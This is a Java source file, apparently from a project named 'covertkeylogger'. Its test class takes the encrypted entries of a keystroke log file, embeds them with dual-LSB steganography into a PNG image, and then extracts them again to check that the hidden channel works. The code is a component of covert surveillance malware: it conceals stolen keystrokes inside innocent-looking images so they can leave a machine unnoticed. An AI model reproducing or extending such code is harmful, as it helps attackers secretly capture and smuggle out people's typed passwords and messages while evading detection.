package covertkeylogger;

import java.awt.image.RenderedImage;
import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import org.steganography.carrier.CarrierImage;
import org.steganography.error.CarrierAccessSchemeException;
import org.steganography.error.CarrierHidingSchemeException;
import org.steganography.error.CarrierInitializationException;
import org.steganography.error.CarrierSizeException;
import org.steganography.error.CompatibilityException;
import org.steganography.error.HidingComponentInitializationException;
import org.steganography.error.HidingComponentSizeException;
import org.steganography.error.HidingException;
import org.steganography.error.InvalidTypeException;
import org.steganography.error.RevealingException;
import org.steganography.hiding.HidingText;
import org.steganography.misc.ImageManager;
import org.steganography.schemes.image.access.SequentialImageAccessScheme;
import org.steganography.schemes.image.hiding.DualLSBImageHidingScheme;
import org.steganography.schemes.image.hiding.SingleLSBImageHidingScheme;
import org.steganography.schemes.modulation.SimpleComponentModulationScheme;

public class StegoTest {

	/**
	 * @param args
	 */
	
	
	//test method to embed encrypted data in one test image
	public void stegoTest() {
				SequentialImageAccessScheme seqImScheme = new SequentialImageAccessScheme();
				DualLSBImageHidingScheme imHidingScheme = new DualLSBImageHidingScheme();
				SimpleComponentModulationScheme compModScheme = new SimpleComponentModulationScheme();
			
				CarrierImage carrierImage = new CarrierImage(seqImScheme, imHidingScheme, compModScheme);
				StoreToList store = new StoreToList("logfile.txt");
				Character nodeForward = '3';
				Character cCMsg = null;
				
			 
				ImageManager imgManager = new ImageManager();
				try {
						//the image to embed data in
						File f = new File("Truecolor.png");
						if(f.exists()) {
							//get the list of encrypted data to embed
							store.generateList();
							List<String> data = store.getEncryptedList();
							
							String stegText = nodeForward + ":" + cCMsg + ":";
							
							for(int i = 0; i < data.size(); i++) {
								stegText = stegText + data.get(i) + " ";
							}
							
							System.out.println("stegText: " + stegText);
							
							RenderedImage img = imgManager.loadImage(f);
							
							carrierImage.setCarrierImage(img);
						 
							HidingText hidingText = new HidingText();
							hidingText.setText(stegText);
							
							//embed data in the image chosen
							carrierImage.hide(hidingText);
							//create a new image file to write the stego image to
							File fS = new File("stegIm.png");
							ImageManager.writeImage(carrierImage.getCarrierImage(), fS, true);
							
							System.out.println("Finished Steganography");
						}
						else {
							System.out.println("File does not exist :/");
						}
						
					
					
				} catch (InvalidTypeException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (CarrierInitializationException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (HidingComponentInitializationException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (HidingException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (HidingComponentSizeException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (CarrierSizeException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (CarrierAccessSchemeException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (CarrierHidingSchemeException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (CompatibilityException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				finally {
					imgManager.terminate();
				}
			}
	
	
	public void deStegoTest() {
		SequentialImageAccessScheme seqImScheme = new SequentialImageAccessScheme();
		DualLSBImageHidingScheme imHidingScheme = new DualLSBImageHidingScheme();
		SimpleComponentModulationScheme compModScheme = new SimpleComponentModulationScheme();
		ArrayList<Character> deStegData = new ArrayList<Character>();
		
	
		CarrierImage carrierImage = new CarrierImage(seqImScheme, imHidingScheme, compModScheme);
	 
		ImageManager imgManager = new ImageManager();
		try {
				File f = new File("stegIm.png");
				
				if(f.exists()) {
					//System.out.println("in deStego if loop");
					
					RenderedImage img = imgManager.loadImage(f);
					
					//System.out.println("wtf???");
					
					carrierImage.setCarrierImage(img);
					HidingText hidingText = new HidingText();
					
					//System.out.println("yes?");
					
					carrierImage.reveal(hidingText);
					//System.out.println("WTAF????!!!!!!");
					String deSteg = hidingText.getText();
					//System.out.println(deSteg);
					
					//System.out.println("size of hiding text: " + hidingText.getSize());
					
					if(deSteg.length() < 1) {
						System.out.println("no data in image!");
					}
					else {
						System.out.println("size of hiding text: " + hidingText.getSize());
						
						System.out.println("deSteg data: " + deSteg);
						
					}
				
			}
				else {
					System.out.println("File does not exist");
				}
			
		}
		catch (InvalidTypeException e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
		}
		catch (IOException e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
		} catch (CarrierInitializationException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (HidingComponentInitializationException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (RevealingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (HidingComponentSizeException e) {
			// TODO Auto-generated catch block
			//e.printStackTrace();
		} catch (CarrierSizeException e) {
			// TODO Auto-generated catch block
			//e.printStackTrace();
		} catch (CarrierAccessSchemeException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (CarrierHidingSchemeException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (CompatibilityException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		finally {
			imgManager.terminate();
		}
		
		
	}
			
			
	public static void main(String[] args) {
		StegoTest steg = new StegoTest();
		steg.stegoTest();
		steg.deStegoTest();
	}
	
}
